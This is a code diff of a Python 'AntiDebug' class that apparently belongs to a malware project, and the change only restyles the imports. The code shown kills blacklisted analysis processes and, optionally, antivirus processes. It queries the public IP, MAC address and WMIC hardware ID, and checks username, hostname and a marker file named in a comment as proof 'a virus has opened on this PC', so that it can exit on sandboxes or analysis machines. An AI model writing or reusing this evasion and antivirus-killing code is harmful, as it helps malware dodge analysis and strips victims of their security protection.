@@ -14,12 +14,12 @@
 """
 All imports
 """
-import os
-import re
-import subprocess
-import uuid
-import psutil
-import requests
+from os import _exit,getenv,sep,path,environ
+from re import findall
+from subprocess import check_output,PIPE
+from uuid import getnode
+from psutil import NoSuchProcess,process_iter,AccessDenied
+from requests import get
 
 """
 class that checks if this computer is suitable
@@ -30,7 +30,7 @@ class AntiDebug:
         self.oneStart = oneStart
         self.avKiller = avKiller
         if self.checks(): # if  this computer is unsuitable prog will exit
-            os._exit(0)
+            _exit(0)
     
     """
     checks PS User names, PC names, HWIDS, IPS or processes
@@ -69,24 +69,24 @@ class AntiDebug:
         return debugging
 
     def check_process(self) -> None:
-        for proc in psutil.process_iter():
+        for proc in process_iter():
             if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                 try:
                     proc.kill()
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                except (NoSuchProcess, AccessDenied):
                     pass
         if self.avKiller:
-            for proc in psutil.process_iter():
+            for proc in process_iter():
                 if any(procstr in proc.name().lower() for procstr in self.Antiviruses):
                     try:
                         proc.kill()
-                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    except (NoSuchProcess, AccessDenied):
                         pass
 
 
     def get_network(self):
-        ip = requests.get('https://api.ipify.org').text
-        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        ip = get('https://api.ipify.org').text
+        mac = ':'.join(findall('..', '%012x' % getnode()))
 
         if ip in self.blackListedIPS:
             return True
@@ -95,16 +95,16 @@ class AntiDebug:
 
     def get_system(self):
         try:
-            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
-                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+            hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
         except:
             hwid = "None"
 
-        username = os.getenv("UserName")
-        hostname = os.getenv("COMPUTERNAME")
-        pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        username = getenv("UserName")
+        hostname = getenv("COMPUTERNAME")
+        pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
         if self.oneStart:
-            if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
+            if (path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
                 return True
 
         for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
